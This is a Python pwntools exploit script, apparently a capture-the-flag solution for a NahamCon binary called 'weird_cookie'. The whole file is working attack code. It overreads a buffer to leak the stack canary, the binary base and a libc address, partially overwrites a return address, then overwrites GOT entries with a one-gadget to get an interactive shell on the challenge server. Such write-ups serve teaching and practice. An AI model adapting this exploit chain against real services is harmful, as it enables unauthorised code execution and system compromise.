#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./weird_cookie"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challenge.nahamcon.com", 30552)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *main+107
		#b *main+175
		b *main+187
		#b *main+221
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# leak canary & bin address
payload = b"A" * 0x8 * 5

p.recvuntil("?")
p.send(payload)

p.recvuntil(payload)
canary = u64(p.recv(8))
log.info("canary: " + hex(canary))
leak = u64(p.recv(6) + b'\0' * 2)
log.info("leak: " + hex(leak))
bin_base = leak - elf.symbols["__libc_csu_init"]
elf.address = bin_base
log.info("bin base: " + hex(bin_base))

payload = b"B" * 0x8 * 5
payload += p64(canary)
payload += p64(0xdeadbeefcafebabe)
payload += p8(0x6d)# partial overwrite

p.recvuntil("?")
p.send(payload)

# leak libc address
payload = b"C" * 0x8 * 5

p.recvuntil("?")
p.send(payload)

p.recvuntil(p64(0xdeadbeefcafebabe))
leak = u64(p.recv(6) + b'\0' * 2)
log.info("leak: " + hex(leak))
libc_base = leak - libc.symbols["__libc_start_main"] - 0xe7
libc.address = libc_base
log.info("libc base: " + hex(libc_base))

# prepare for GOT Overwrite
payload = b"D" * 0x8 * 5
payload += p64(canary)
payload += p64(elf.got["puts"] + 0x30)
payload += p64(elf.symbols["main"] + 158)

p.recvuntil("?")
p.send(payload)

payload = p64(libc_base + 0x10a2fc)# puts
payload += p64(libc.symbols["setbuf"])# setbuf
payload += p64(libc.symbols["puts"])# memset
payload += p64(libc.symbols["read"])
payload += p64(elf.symbols["main"] + 90)# exit

p.send(payload)

p.interactive()
